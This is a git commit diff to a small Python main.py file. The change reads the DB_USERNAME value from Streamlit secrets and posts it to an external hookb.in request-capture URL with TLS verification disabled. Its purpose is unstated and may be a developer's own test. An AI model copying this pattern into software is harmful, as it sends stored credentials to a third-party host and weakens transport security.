dde8007566db0a087fe4cd4c67421aae2f257caa
anisharora55 <97957325+anisharora55@users.noreply.github.com>
2022-01-18 18:16:09 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,10 @@
 import requests
+import streamlit as st
+
+username = st.secrets["DB_USERNAME"]
 
 url = 'https://hookb.in/G90xNbkeW2HE2xPP2o0O'
 
-data =""
+data = username
 
 r = requests.post(url, verify=False, data=data)
